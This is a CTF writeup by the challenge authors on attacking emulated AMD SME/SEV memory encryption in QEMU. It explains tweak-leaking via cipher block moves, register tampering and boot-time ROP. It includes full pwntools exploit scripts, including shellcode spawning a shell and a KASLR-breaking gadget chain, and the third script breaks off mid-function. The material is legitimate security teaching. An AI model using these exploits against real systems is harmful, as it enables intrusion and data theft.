---
title: "hxp_silicon_foundaries_hack3 - hxp 38C3 CTF"
category: "crypto"
subcategory: "aes"
type: "writeup"
tags: ["crypto", "aes", "xor", "pwndbg", "firmware", "uart", "proof-of-work", "hxp-38c3-ctf", "ctf-writeup"]
summary: "Sun, 29 December 2024 ~ sisu"
source:
  name: "CTFtime writeup #39728"
  url: "https://ctftime.org/writeup/39728"
original_source: "https://hxp.io/blog/117/hxp-38C3-CTF-hack1-hack2-hack3/"
ctf:
  name: "hxp 38C3 CTF"
  challenge: "hxp_silicon_foundaries_hack3"
---

## Metadata

- **CTF:** hxp 38C3 CTF
- **Task:** hxp_silicon_foundaries_hack3
- **Author team:** hxp
- **CTFtime:** <https://ctftime.org/writeup/39728>
- **Original writeup:** <https://hxp.io/blog/117/hxp-38C3-CTF-hack1-hack2-hack3/>

---
Sun, 29 December 2024 ~ sisu

## hxp 38C3 CTF: hack1, hack2, hack3

hack1: MSC, CRY (625 points, 7 solves)  
hack2: MSC, PWN (769 points, 4 solves)  
hack3: PWN, MSC (833 points, 3 solves)

This is a writeup covering the challenges [hack1](https://2024.ctf.link/internal/challenge/abcf8373-3eb2-40bd-80e8-e9a6d122b81d/), [hack2](https://2024.ctf.link/internal/challenge/f783a931-97cb-43a8-bf16-381bd0b612f8/), [hack3](https://2024.ctf.link/internal/challenge/16e69ddd-62b2-467a-9bbc-2ed0867c8e48/) as all three are similar.

### Memory encryption

The “hack-1” to “hack-3” is a series of challenges on hacking platforms with enabled memory encryption.

There’s a wide variety of memory encryption technologies available, but among the more widely available and researched is the family of memory encryption features from AMD [[1](https://www.amd.com/en/developer/sev.html)]. There are plenty from AMD - Secure Memory Encryption (SME) [[2](https://www.amd.com/content/dam/amd/en/documents/epyc-business-docs/white-papers/memory-encryption-white-paper.pdf)], Secure Encrypted Virtualization (SEV) [[2](https://www.amd.com/content/dam/amd/en/documents/epyc-business-docs/white-papers/memory-encryption-white-paper.pdf)], SEV-Encrypted State (SEV-ES) [[3](https://www.amd.com/content/dam/amd/en/documents/epyc-business-docs/white-papers/Protecting-VM-Register-State-with-SEV-ES.pdf)], SEV-Secure Nested Paging (SNP). Today, these features seem to be limited to the AMD EPYC product line.

The hack challenges emulate selected parts of the memory encryption solutions using QEMU based on publicly available research papers.

  * hack-1 provides a playground for AMD SME
  * hack-2 and hack-3 provide a playground for AMD SEV In both cases, only the Application Processor is emulated instead of the whole system that also includes a Security Processor.


The _hack-1_ challenge covers the limitation of memory integrity and weak block cipher mode in the first version of AMD SEV implementations (AMD EPYC 7251). The _hack-2_ challenge covers the limitation of confidentiality and integrity of the AMD SEV VM’s registers that can be both read and modified in-between VM-exit and VM-enter. The _hack-3_ challenge covers the limitation of memory integrity and explores the application of IAGO attacks [[4](https://escholarship.org/content/qt9dw8h2t7/qt9dw8h2t7_noSplash_c984e4cab06e6ebccc93095e5da9b862.pdf)] on AMD SEV (and SEV-ES).

Each challenge provides a list of commands for interacting with the VM. Commands include reading or writing physical memory, reading or changing registers, reading or writing to UART. The commands interface is provided to steer teams to focus on specific limitations of the implementations and to limit easier unintended exploits that are irrelevant to the challenges.

QEMU was used for emulating the features. While QEMU supports setting up AMD SEV VMs with KVM on authentic EPYC platforms, QEMU does not support emulating the features. This required me to implement AMD SEV/SME based on an interpretation of how the features work. I added support for the features in the QEMU TCG Interpreter (TCI) that interprets the IR instead of JIT-ing it. The above slowed down VM boot considerably to 1-5 minutes depending on the boot flow, and also probably slowed down many teams. At the same time, it was the only way to get started bringing-up these features in QEMU since it allowed a simpler implementation and better debugging support.

In the challenges, memory encryption emulation consists of CPU info and state reporting, supporting runtime memory encryption, encrypting the boot firmware and making adjustments to the MMU for selecting if memory accesses are encrypted.

Info reporting only consists of reporting that memory encryption is supported (CPUID leaf 0x8000001f) and if SEV/SME are functionally enabled (MSRs 0xc0010010, 0xc0010131) [[7](https://docs.kernel.org/arch/x86/amd-memory-encryption.html)].

Runtime memory encryption required adding a fake memory region that aliases the system memory but maps to physical address with offset +128 TiB (C-bit 47 set). When the MMU detects that the access falls into the encrypted physical region, then QEMU will encrypt writes and decrypt reads. Encryption and decryption is done for each accessed 16-byte block (16-byte sized, 16-byte aligned). For each access, the used block cipher is AES-128 and the block cipher mode is Tweaked XOR-Encrypt - for encryption, the Physical Address is used to calculate a secret XOR mask, the 16-byte block is XOR-ed with the mask and then encrypted using AES.

Under AMD SEV, the firmwares are encrypted before starting the VM because instruction fetches always have encryption mode enabled. If the firmwares are not encrypted on launch, the VM would simply crash due to the above. The firmware is the OVMF_CODE.fd binary (code only) or OVMF.fd binary (code + UEFI storage). Regarding hack1, note that AMD SME feature differs from AMD SEV feature in that the system boots into non-encrypted state and the kernel (Linux) has the responsibility to encrypt the memory and resume execution into the encrypted state.

Apart from the above, the MMU has updated logic for determining if the access must be treated as an encrypted access. Accesses with paging disabled, instruction fetches, accesses during page table walks, and memory accesses with the C=1 page table bit set are always encrypted memory accesses. Other memory accesses are unencrypted.

Debugging the VMs is impractical because the memory is encrypted and extensions like pwndbg get confused. One workaround is to update `decrypt_block` and `encrypt_block` in QEMU to be NOPs, which would disable memory encryption while still booting the VM as an encrypted VM. Another workaround is to update gdb-pt-dump to zero-out the C-bit after reading the page table entries [[11](https://github.com/martinradev/gdb-pt-dump/blob/master/pt/pt_x86_64_parse.py#L219)] which would allow examining virtual memory conveniently.

The rest of the write-up covers each challenge individually.

### hack-1

This challenge covers the limitation of memory integrity and weak block cipher mode in the provided implementation (and first implementation of AMD SME and AMD SEV). The flaw in the block cipher mode was first discussed in [[6](https://arxiv.org/pdf/1712.05090)] and a generic exploit was later shown in [[5](https://arxiv.org/pdf/2004.11071)].

The challenge provides commands for reading and writing the ciphertext, and commands for reading and writing to UART. Within the VM, there’s a ping service that accepts a 16-byte-long string over UART, and the service prints a 66-byte-long string and time over UART. The ping service’s responses over UART are intended to serve as a decryption oracle to dump secrets, and the input to the ping service over UART is intended to work as an encryption oracle to allow injecting code into the VM.

The idea of using “cipher block moves” to leak the tweak constants (or combinations of them) and the same for injecting data or code is already covered in [[6](https://arxiv.org/pdf/1712.05090)]. When moving a cipher block ENC_A from Physical Address A (PA_A) to PA_B, the ciphertext at PA_B will be _enc(tweaks(PA_A) ^ DATA_A)_. When the CPU reads the ciphertext at PA_B, the resulting plaintext will be _tweaks(PA_A) ^ tweaks(PA_B) ^ DATA_A_. If the resulting plaintext is leaked and DATA_A is known (all zeroes, binary known, etc), the result of _tweaks(PA_A) ^ tweaks(PA_B)_ become known. If sufficiently many tweak XORs are leaked, the ciphertexts can be recovered by solving the formed linear equation.

The exploit is to inject code into the ping service to spawn a shell.

First locate where the ping service is loaded into physical memory by starting at a fixed physical page, updating the block value at offset 0x30 in the page, sending a ping and then restoring the original block value. If the ping service outputted partially garbage data, then the .rodata section is found and from that the rest of the binary’s location in physical memory can be inferred.

Second step is to locate where the writeable .data section is located since that’s necessary for finally being able to inject code. Since this is a Copy-on-Write page and it gets written to when sending data to the service, the page will be separately allocated and its location needs to be determined. The page can be found by starting a search from 0x1b00000, collecting the block at offset 0x280 (offset for the input scratch buffer), sending a ping with garbage data and then reading the same block. If the block’s ciphertext changed its value, then most likely this is the page where the .data section starts.

Knowing the .rodata section’s location, the decryption oracle can be used to dump enough leaks to cover the .text, .data and .rodata sections, and then the applied tweaks for that physical range can be recovered. Once the tweaks are recovered, the ping service can be used to write data into the scratch buffer. The tweaks can be used to encode the data in such a way that once the block is moved from the scratch buffer to a target address, the plaintext is whatever the attacker intended.

The exploit injects a payload to start a shell at the start of .text, and then injects a final block in the main() code to jump into the payload. Finally, the flag is dumped from the fw_cfg FS - “/sys/firmware/qemu_fw_cfg/by_name/opt/flag/raw”

```
    #!/usr/bin/env python3
    
    from pwn import *
    from common import *
    import time
    import sys
    
    used_tweak_bits = 0
    
    def hack():
        DEBUG = False
        io = remote(sys.argv[1], int(sys.argv[2]))
    
        r = io.readline().decode("ascii")
        info(f"POW: {r}")
        sol = do_pow(r)
        info(f"Solution: {sol}")
        io.sendline(sol.encode())
    
        t1_boot = time.time()
        info("Waiting for VM to boot...")
        io.readuntil(b"Here and ready for hacking!")
        t2_boot = time.time()
        info(f"Boot took {t2_boot - t1_boot} secs")
    
        # I considered that trying to break KASLR adds an additional dimension that wouldn't be hard
        # but it requires making a few too many requests for reading blocks, so we either need to
        # expand the frontend app to offer better commands or teams needs to themselves ensure they
        # have a fast connection. I think it wouldn't be fun, so not going to add breaking physical KASLR.
    
        image_base = 0x1000000
        entrypoint_rodata_start_search = 0xa04000
        entrypoint_data = 0xa05000
    
        # This moves blocks and sends a ping to check if the printed data changes
        # If it changes, then the .rodata section is found and with that the rest
        # of the non-writeable sections of the executable.
        info("Find entrypoint physical address")
        addr = entrypoint_rodata_start_search
        found_addr = None
        for u in range(33):
            info(f"Read iter {u}")
            tmp_addr = addr + u * 0x1000 + 0x30
            block = read_data(io, tmp_addr, 0x10)
            write_data(io, tmp_addr, b"A" * 0x10)
            send_ping(io)
            data = read_ping_data(io)
            msg = b"---- HXP Silicon Foundaries ----"
            if data[0:16] == msg[0:16] and msg[16] != data[16]:
                found_addr = addr + u * 0x1000
                write_data(io, tmp_addr, block)
                break
            write_data(io, tmp_addr, block)
    
        if found_addr == None:
            error("Failed to find address")
            raise Exception("Failed to find address")
    
        info(f"Found rodata section: {hex(found_addr)}")
        print_stats()
    
        # The .data section is writeable, so the page will be allocated somewhere else
        # once a ping is sent due to copy-on-write (COW).
        #
        # The technique for finding the page is to read a number of blocks where the
        # data is constant, and then send a ping. After the ping, the contents would
        # have changed and so does the ciphertext.
    
        data_section_start = 0x1b00000
        num_blocks = 256
        t1_collect = time.time()
        recorded_blocks = []
        for u in range(num_blocks):
            info(f"Collecting block {u}")
            addr = data_section_start + u * 0x1000 + 0x280
            block = read_data(io, addr, 0x10)
            recorded_blocks.append(block)
    
        print_stats()
    
        t2_collect = time.time()
        info(f"Finished collecting blocks. It took {t2_collect - t1_collect} secs")
        write_uart(io, b"A" * 16)
        found_page_index = None
        for u in range(num_blocks):
            addr = data_section_start + u * 0x1000 + 0x280
            block = read_data(io, addr, 0x10)
            if recorded_blocks[u] != block:
                if found_page_index:
                    raise Exception("More than single data block found")
                found_page_index = u
    
        if found_page_index == None:
            raise Exception("Failed to find data page")
    
        print_stats()
        data_cow_page_addr = data_section_start + found_page_index * 0x1000
        info(f"Found data page addr at {hex(data_cow_page_addr)}")
    
        info("Gathering leaks")
    
        # Use the ping to gather leaks and determine the relevant tweak constants.
        #
        # When moving a block from PA_1 to PA_2, where PA_2 holds data that would be printed,
        # the printed data is plaintext(PA_1) ^ tweak(PA_1) ^ tweak(PA_2). If the plaintext
        # at PA_1 is known, then the leak is tweak(PA_1) ^ tweak(PA_2). With sufficiently many
        # leaks, the tweak constants can be determined by (TODO: add explanation)
    
        def gather_leaks(cmd_io, target_start_addr, overwrite_addr, data_off, num_leaks):
            leaks = []
            for u in range(num_leaks):
                target_addr = target_start_addr + u * 0x10
                block = read_data(io, target_addr, 0x10)
                orig_block = read_data(io, overwrite_addr, 0x10)
                write_data(io, overwrite_addr, block)
                send_ping(io)
                data = read_ping_data(io)
    
                leak = data[data_off:data_off+16]
                if data[64:66] != b"-\n":
                    raise Exception(f"Incorrect data. {data}")
                write_data(io, overwrite_addr, orig_block)
    
                leaks.append(leak)
            return leaks
    
        rodata_addr = found_addr
        text_addr = rodata_addr - 0x5000
        data_addr = rodata_addr + 0x3000
        info(f"Leak addr and target addr: rodata={hex(rodata_addr)}, text={hex(text_addr)}")
    
        leaks_rodata = b"".join(gather_leaks(io, rodata_addr, rodata_addr + 0x20, 0, 64))
        leaks_text = b"".join(gather_leaks(io, text_addr, rodata_addr + 0x20, 0, 4))
        leaks_data = b"".join(gather_leaks(io, data_addr, rodata_addr + 0x20, 0, 4))
        leaks_data_cow = b"".join(gather_leaks(io, data_cow_page_addr + 0x280, rodata_addr + 0x20, 0, 1))
    
        print_stats()
    
        if DEBUG:
            open("leaks_rodata.txt", "wb+").write(leaks_rodata)
            open("leaks_text.txt", "wb+").write(leaks_text)
            open("leaks_data.txt", "wb+").write(leaks_data)
            open("leaks_data_cow.txt", "wb+").write(leaks_data_cow)
    
        info("Compute keys")
        def compute_tweaks(leaks_rodata, leaks_text, leaks_data):
            elf = ELF('./entrypoint')
            rodata = elf.get_section_by_name('.rodata').data()[:0x1000].ljust(0x1000, b"\x00")
            text = b"\x00" * 0x10 + elf.get_section_by_name(".text").data()[:0x1000]
            data = b"\x00" * 0x20 + elf.get_section_by_name(".data").data()[:0x1000]
    
            # Fake 0 bytes
            data_fake = b"\x00" * 0x1000
    
            make_blocks = lambda data: [int.from_bytes(data[i:i+16], 'little') for i in range(0, len(data), 16)]
    
            leaks_rodata_blocks = make_blocks(leaks_rodata)
            leaks_text_blocks = make_blocks(leaks_text)
            leaks_data_blocks = make_blocks(leaks_data)
            rodata_blocks = make_blocks(rodata)
            text_blocks = make_blocks(text)
            data_blocks = make_blocks(data)
    
            tweaks = {}
            tweaks[1] = leaks_rodata_blocks[0] ^ rodata_blocks[0]
    
            for u in range(0, 4):
                block_index = (1 << u)
                if u not in tweaks:
                    tweaks[u] = rodata_blocks[block_index] ^ tweaks[1] ^ leaks_rodata_blocks[block_index]
    
            tweaks_ordered = [tweaks[i] for i in range(0, 4)]
            k8_xor_k10 = text_blocks[2] ^ leaks_text_blocks[2]
            k11 = data_blocks[2] ^ leaks_data_blocks[2] ^ k8_xor_k10
    
            return (tweaks_ordered, k8_xor_k10, k11)
    
        tweaks_on_page, tweak_k8_xor_k10, tweak_k11 = compute_tweaks(leaks_rodata, leaks_text, leaks_data)
    
        # TODO: k11 is wrong
    
        info("Tweaks:")
        for i, k in enumerate(tweaks_on_page):
            info(f"t_{i} = {k:032x}")
        info(f"k8 ^ k10 = {tweak_k8_xor_k10:032x}")
        info(f"k11 = {tweak_k11:032x}")
    
        def gather_page_tweaks(tweaks_on_page, addr):
            global used_tweak_bits
            addr >>= 4
            res = 0
            for u in range(8):
                if addr & (1<<u):
                    used_tweak_bits |= (1 << u)
                    res ^= tweaks_on_page[u]
            return res
    
        leaks_data_cow_block = int.from_bytes(leaks_data_cow, 'little')
        leaks_data_cow_block_only_tweaks = leaks_data_cow_block ^ int.from_bytes(b"Who is the best?", 'little')
        info(f"k_cow_page_all_tweaks = {leaks_data_cow_block_only_tweaks:032x}")
    
        def write_text_payload(addr, block):
            info(f"Write block to {hex(addr)}")
            assert(len(block) <= 16 and len(block) != 0)
            assert(addr >= text_addr and addr < (text_addr + 0x1000))
            v = int.from_bytes(block, 'little') ^ leaks_data_cow_block_only_tweaks ^ gather_page_tweaks(tweaks_on_page, (rodata_addr | 0x20) ^ addr) ^ tweak_k8_xor_k10
            v = v.to_bytes(16, 'little')
            v = v.ljust(16, b"\x00")
            write_uart(io, v)
    
            # TODO: this sleep is here because there's a race between writing out the data and reading the block
            time.sleep(1)
    
            block = read_data(io, data_cow_page_addr + 0x280, 0x10)
            write_data(io, addr, block)
    
        payload = asm("""
        xor rsi,rsi
        push rsi
        mov rdi,0x0068732f6e69622f
        push rdi
        push rsp
        pop rdi
    
        push rsi
        pop rdx
    
        push rsi
        push rdi
        push rsp
        pop rsi
    
        push 59
        pop rax
        cdq
        syscall
        """, arch="amd64")
    
        info(f"Write payload to {hex(text_addr)}")
        for i in range(0, len(payload), 16):
            block = payload[i: i + 16]
            write_text_payload(text_addr + i, block)
    
        info("Write relative jump to payload")
        payload = asm("""
        mov eax, 0x401000
        jmp rax
        """, arch="amd64")
        assert(len(payload) <= 16)
    
        # The 0xc0 offset corresponds to the "mov edi, 0x1" below
        # 0xc0 is convenient because the relative jump payload could be at the start of the block
        #
        # 004010b6 48 8d 35        LEA        RSI,[s_----_HXP_Silicon_Foundaries_----_004060   = "---- HXP Silicon Foundaries -
        #          63 4f 00 00
        # 004010bd 48 89 e5        MOV        RBP,RSP
        # 004010c0 bf 01 00        MOV        EDI,0x1
        #          00 00
        # 004010c5 e8 ba 1f        CALL       FUN_00403084                                     undefined FUN_00403084()
        #          00 00
        #
        # jump to 0x401000 where the payload is written
        write_text_payload(text_addr + 0xc0, payload)
    
        info(f"Used tweaks: {bin(used_tweak_bits)}")
    
        # Send ping in order to trigger the payload
        send_ping(io)
    
        # Send ls
        write_uart(io, b"echo -n \"flag:\" && cat /sys/firmware/qemu_fw_cfg/by_name/opt/flag/raw\n")
    
        read_until(io, b"flag:")
        read_until(io, b"flag:")
        flag = read_until(io, b"}").decode("ascii")
        info(f"Flag: {flag}")
        write_uart(io, b"exit\n")
    
        print_stats()
    
    if __name__ == "__main__":
        num_tries = 8
        for i in range(num_tries):
            info(f"Attempt {i+1}/{num_tries}")
            try:
                hack()
            except Exception as e:
                info(f"Fail: {e}")
                continue
            exit(0)
    
        print("Exploit failed", file=sys.stderr)
        exit(1)
```

Flag: `hxp{h4ck1ng_m3m0ry_eNcr1pti0n_w1th0ut_1nt3Gr1ty}`

### hack-2

The hack-2 challenge covers the limitation of confidentiality and integrity of the AMD SEV VM’s registers that can be both read and modified in-between VM-exit and VM-enter. The offered commands are only read registers and update registers. The challenge boils down to breaking KASLR, then doing register updates to leak the flag from the FW CFG.

Breaking KASLR is trivial since the VM is mostly idle and the registers contain kernel addresses. The exploit below tries to be smarter to collect possible KASLR image bases and select the most likely one. This is not necessary for solving the challenge, but it can make the exploit more reliable.

There are different possibilities for leaking the flag - injecting a payload into kernel memory or overwriting userspace programs (via rootfs), or using gadgets to load the flag and leak it via registers. The latter approach is the simplest and least error-prone.

The exploit calls into `fw_cfg_read_blob` by updating RIP and the argument registers to dump the flag at a specified physical address. The flag then needs to be leaked via registers by using a suitable gadget to read the flag into registers and then get the flag by reading the registers. The only caveat is that faults in the VM will cause the registers to be overwritten and prevent leaking the flag.

The used gadget is `0xffffffff8127cd72: pop rdx; jmp rbx;` where `rdx` is used for leaking 8 bytes of the flag and `rbx` is set to point to `inf_loop_rip = image_base + 0xc6a` that contains `eb fe` (infinite loop). This allows storing 8 bytes of the flag into the rdx register and allows preventing a subsequent crash by getting the VM into an infinite loop.

Note that the `fw_cfg_read_blob` call will cause a fault but the VM still continues execution. Even if faults were made fatal and cause a VM shutdown, it would have likely been possible to always win a race to prevent the VM shutdown due to the VM’s slowness.

Exploit:

```
    #!/usr/bin/env python3
    
    from pwn import *
    import time
    import sys
    import os
    
    def do_pow(s):
        import re, subprocess, time
        m = re.search(r'please give S such that sha256\(unhex\("([0-9a-f]+)" \+ S\)\) ends with ([0-9]+) zero bits', s)
        if m is None:
            raise Exception("Failed to parse pow", f)
        prefix = m.groups()[0]
        difficulty = int(m.groups()[1])
        info(f'[starting PoW... difficulty=\x1b[35m{difficulty}\x1b[0m prefix=\x1b[35m{prefix}\x1b[0m]')
        t0 = time.time()
        sol = subprocess.check_output(['./pow-solver', str(difficulty), prefix]).decode().strip()
        info('[PoW took \x1b[35m{}\x1b[0m seconds ~> \x1b[35m{}\x1b[0m.]'.format(time.time() - t0, sol))
        return sol
    
    def dump_registers(cmd_io):
        cmd_io.readuntil(b"1. Show registers")
        cmd_io.sendline(b"1")
        res = cmd_io.readuntil(b"Menu:")
        res = res[:-5].decode("ascii")
        res = [u.strip() for u in res.split("\n")][2:-1]
        mp = {}
        for u in res:
            v = u.split("=")
            mp[v[0]] = int(v[1], 16)
        return mp
    
    def update_registers(cmd_io, regs):
        cmd_io.readuntil(b"2. Update registers")
        cmd_io.sendline(b"2")
        cmd_io.readuntil(b"List registers:")
        s = ";".join(f"{k}={hex(regs[k])}" for k in regs)
        cmd_io.sendline(s.encode("ascii"))
    
    def get_symbol_in_range(elf, address):
        """ Checks if address is within bounds of an existing symbol """
        best_delta = 2 ** 63
        best_symbol = None
        for symbol, addr in elf.symbols.items():
            size = elf.symbols[symbol] if symbol in elf.symbols else 0
            delta = address - addr
            if delta >= 0 and delta < best_delta:
                best_delta = delta
                best_symbol = symbol
        return best_symbol
    
    def check_if_symbol_is_meaningful(elf, found_symbol, leak_address):
        """
        Calculate a score for the target address and potentially matching symbols
        - 3 if no errors in disassembly and jmp/ret/call are found in the block
        - 2 if no errors
        - 1 if errors in disassembly, but has jmp/ret/call in the block
        - 0 otherwise
        """
        symbol_start_addr = elf.symbols[found_symbol]
        bytes_start_to_leak = elf.read(symbol_start_addr, leak_address - symbol_start_addr)
        bytes_leak_to_16_bytes_later = elf.read(leak_address, 16)
        disasm_start = disasm(bytes_start_to_leak, arch=elf.arch)
        disasm_later = disasm(bytes_leak_to_16_bytes_later, arch=elf.arch)
        score = 0
        if "bad" not in disasm_start:
            score += 2
    
        for line in str(disasm_later).split("\n"):
            if "ret" in line or "jmp" in line or "call" in line:
                score += 1
                break;
            if "(bad)" in line:
                break;
    
        return score
    
    def test_addr(elf, addr):
        """
        For a leaked RIP address, calculate a few possible image base addresses and their scores.
        Each possible image address is one of the few preceding 2MiB-aligned VAs.
        The functions returns the image base with the highest score
        """
        res = []
        for i in range(5):
            try:
                aligned_based_addr = (addr - i * 2 * 1024 * 1024) & ~(2 * 1024 * 1024 - 1)
                elf.address = aligned_based_addr
                symb = get_symbol_in_range(elf, addr)
                score = check_if_symbol_is_meaningful(elf, symb, addr)
                res.append((symb, score, aligned_based_addr, addr))
            except Exception as e:
                info(str(e))
                pass
        res = sorted(res, key=lambda x: x[1])
        return res[-1]
    
    def find_most_promosing_base(leaks):
        """
        For each leaked RIP address, find the most promising image base and its score.
        Return the image base with the promising score among all leaks.
        """
        if os.path.exists("./vmlinux"):
            elf = ELF("./vmlinux")
        else:
            elf = ELF("./kernel_additional_files/vmlinux")
    
        s = elf.symbols['_text']
        scores = []
        for leak_addr in leaks:
            try:
                res = test_addr(elf, leak_addr)
                scores.append(res)
            except Exception as e:
                info(str(print(e)))
                pass
        scores = sorted(scores, key=lambda x: x[1])
        if len(scores) > 0:
            return scores[-1]
        return None
    
    def print_regs(regs):
        for k in regs:
            r = regs[k]
            info(f"{k} = {hex(r)}")
        info(30 * "-")
    
    def hack():
        t1 = time.time()
    
        io = remote(sys.argv[1], int(sys.argv[2]))
        r = io.readline().decode("ascii")
        info(f"POW: {r}")
        sol = do_pow(r)
        info(f"Solution: {sol}")
        io.sendline(sol.encode())
    
        t1_boot_time = time.time()
        info("Waiting for VM to boot...")
        io.readuntil(b"Here and ready for hacking!")
        t2_boot_time = time.time()
        info(f"Boot took {t2_boot_time - t1_boot_time} secs")
    
        # Determine KASLR image base
        info("Collect RIP leaks")
        rip_leaks = []
        for u in range(8):
            regs = dump_registers(io)
            print_regs(regs)
            rip = regs['rip']
            if rip & (1 << 63):
                rip_leaks.append(rip)
            time.sleep(0.2)
    
        info("Find most promising image base")
        res = find_most_promosing_base(rip_leaks)
        if res == None:
            raise Exception("Failed to determine image base")
        symb_name, score, image_base, leak_addr = res
        info(f"Determined image base is {hex(image_base)} through symbol {hex(leak_addr)} ({symb_name}) with score {score}")
    
        regs = dump_registers(io)
        target_addr = image_base + 0x1157000
        info(f"Use {hex(target_addr)} for dumping flag")
    
        # The call to fw_cfg_read_blob would read the flag into 'target_addr'
        info("Call fw_cfg_read_blob")
        fw_cfg_read_blob = image_base + 0x6544f0
        flag_key = 46
        update_registers(io, {'rip': fw_cfg_read_blob, 'rdi': flag_key, 'rsi': target_addr, 'rdx': 0, 'rcx': 64})
        time.sleep(1)
    
        # Clear interrupts
        # This reduces the chance of an interrupt causing noise and failures in the exploit
        # The wrmsr will also disable NX that I originally thought was necessary before finding a sufficiently good gadget.
        # 0xffffffff8105a57a: cli; wrmsr; pop r12; pop r15; ret;
        wrmsr = image_base + 0x5a57a
        update_registers(io, {'rip': wrmsr, 'rdx': 0, 'rax': 0x501, 'rcx': 0xc0000080})
    
        # Dump the flag by reading 8-bytes into rdx and jumping into an infinite loop to prevent the register from being clobbered.
        # 0xffffffff8127cd72: pop rdx; jmp rbx;
        leak_rip = image_base + 0x000000000027cd72
        inf_loop_rip = image_base + 0xc6a
        flag_leaks = []
        known_value = 0x1337133713371337
        update_registers(io, {'rip': inf_loop_rip})
        time.sleep(1)
        for off in range(0, 64, 8):
            update_registers(io, {'rip': leak_rip, 'rdx': known_value, 'rsp': target_addr + off, 'rbx': inf_loop_rip})
            time.sleep(1)
            regs = dump_registers(io)
            flag_leaks.append(regs['rdx'])
    
        # Re-assemble the flag and check that it matches a known pattern
        info(f"Leaks {flag_leaks}")
        flag = b"".join(u.to_bytes(8, 'little') for u in flag_leaks)
        flag = flag[:flag.find(b"}") + 1].decode("ascii")
        if re.match(r"hxp\{.{4,}\}", flag):
            t2 = time.time()
            info(f"Exploit took {t2 - t1} secs")
            print("Flag:", flag)
        else:
            raise Exception(f"'{flag}' does not match pattern")
    
    num_tries = 8
    for i in range(num_tries):
        info(f"Attempt {i+1}/{num_tries}")
        try:
            hack()
        except Exception as e:
            info(f"Fail: {e}")
            continue
        exit(0)
    
    print("Exploit failed", file=sys.stderr)
    exit(1)
```

Flag: `hxp{c0nf1d3nt14l_c0mpuTe_0n3_ne3dS_t0_s7arT_Fr0M_s0mw3wh3re}`

### hack-3

The hack-3 challenge covers the limitation of memory integrity and explores the application of IAGO attacks [[4](https://escholarship.org/content/qt9dw8h2t7/qt9dw8h2t7_noSplash_c984e4cab06e6ebccc93095e5da9b862.pdf)] on AMD SEV (and SEV-ES). The challenge provides one with commands to read memory blocks, write memory blocks, pause VM execution on a given physical page access, remove watching a page, and resume execution. The commands are intended to allow pausing execution at specific points and corrupting specific pages to eventually gain code execution.

For background, there’s a known technique for doing ROP by causing the VM to decrypt the stack memory during boot. The technique was shown in [[8](https://arxiv.org/pdf/2010.07094)] in _Section 6. Code Execution via Guest Page Table Corruption_ where the HV would report that SEV is not supported, via CPUID interception, and then overwrite the stack when the VM enables paging with the stack memory mapped as decrypted (since the VM thinks encryption is not supported). Doing the exploit is only possible during boot and requires careful timing that’s possible by causing Nested Page Table faults.

The same is possible in this challenge, but it requires convincing the VM that memory encryption is disabled by means of memory corruption. One of the components viable for exploitation is OVMF that stores the VM type (regular VM, SEV, SEV-ES, SEV-SNP, TDX) into an OVMF_WORK_AREA [[9](https://github.com/tianocore/edk2/blob/fc140c5eae8ac9cc183f6b96bfe4b595b7119301/OvmfPkg/Include/WorkArea.h#L108)] object, that’s always at a fixed address according to my local runs. The VM type is used to determine if SEV is enabled [[10](https://github.com/tianocore/edk2/blob/fc140c5eae8ac9cc183f6b96bfe4b595b7119301/OvmfPkg/Sec/AmdSev.c#L257)] and to determine if the encryption bit should be set when creating the page tables before switching to long mode.

The exploit is as follows:

  1. pause the VM at the start and corrupt the OVMF_WORK_AREA so that OVMF thinks it’s not running inside an encrypted VM.
  2. continue execution until the VM is about to do a far jump to enable long mode
  3. once watchpoint is hit, fix the GDT (since it would be corrupted with encryption disabled) and write the ROP chain on the stack


The tricky part for ROP is that the loaded UEFI modules are the 32-bit variants still, so one needs to be careful what gadgets and functions are used. Calling large functions in the 32-bit modules will crash due to the code being interpreted in 64-bit mode now. The exploit uses IO code blocks to interact with the FW CFG to read the flag into decrypted memory.

Note some teams apparently timed DMA operations into decrypted bounce buffer memory, I assume, to load their own kernel or initramfs - waiting for a write-up. This is also a valid solution considering device communication has been previously shown to be insecure [[12](https://www.usenix.org/system/files/sec19-li-mengyuan_0.pdf)].

Exploit:

```
    #!/usr/bin/env python3
    
    from pwn import *
    import sys
    
    def do_pow(s):
        import re, subprocess, time
        m = re.search(r'please give S such that sha256\(unhex\("([0-9a-f]+)" \+ S\)\) ends with ([0-9]+) zero bits', s)
        if m is None:
            raise Exception("Failed to parse pow", f)
        prefix = m.groups()[0]
        difficulty = int(m.groups()[1])
        info(f'[starting PoW... difficulty=\x1b[35m{difficulty}\x1b[0m prefix=\x1b[35m{prefix}\x1b[0m]')
        t0 = time.time()
        sol = subprocess.check_output(['./pow-solver', str(difficulty), prefix]).decode().strip()
        info('[PoW took \x1b[35m{}\x1b[0m seconds ~> \x1b[35m{}\x1b[0m.]'.format(time.time() - t0, sol))
        return sol
    
    def wait_menu(io):
        io.readuntil(b"8. Clear watched page\n")
    
    def write_data(cmd_io, pa, data):
        wait_menu(cmd_io)
        assert(len(data) % 8 == 0)
        cmd_io.sendline(b"2")
        cmd_io.readuntil(b"Physical Adddress (hex):")
        cmd_io.sendline(hex(pa).encode("ascii"))
        cmd_io.readuntil(b"Num bytes:")
        cmd_io.sendline(str(len(data)).encode("ascii"))
        cmd_io.readuntil(b"Data: ")
        cmd_io.send(data)
    
    def read_data(cmd_io, pa, len):
        wait_menu(cmd_io)
        assert(len % 8 == 0)
        cmd_io.sendline(b"1")
        cmd_io.readuntil(b"Physical Adddress (hex):")
        cmd_io.sendline(hex(pa).encode("ascii"))
        cmd_io.readuntil(b"Num bytes:")
        cmd_io.sendline(str(len).encode("ascii"))
        cmd_io.readuntil(b"Data: ")
        data = cmd_io.readline()[:-1]
        data = bytes.fromhex(data.decode("ascii"))
        return data
    
    def read_until_fast(cmd_io, pattern):
        wait_menu(cmd_io)
        cmd_io.sendline(b"4")
        cmd_io.readuntil(b"Num bytes:\n")
        cmd_io.sendline(str(len(pattern)).encode("ascii"))
        cmd_io.readuntil(b"Pattern:\n")
        cmd_io.send(pattern)
        return cmd_io.readuntil(pattern)
    
    def read_uart(cmd_io, length):
        wait_menu(cmd_io)
        cmd_io.sendline(b"3")
        cmd_io.readuntil(b"Num bytes:\n")
        cmd_io.sendline(str(length).encode("ascii"))
        buf = b""
        for u in range(length):
            q = cmd_io.read(1)
            if q:
                buf += q
            # if len(buf) % 0x100 == 0:
            #     print(len(buf))
            if len(buf) == length:
                break
        return buf
    
    def pause_at_page(io, addr):
        wait_menu(io)
        io.sendline(b"5")
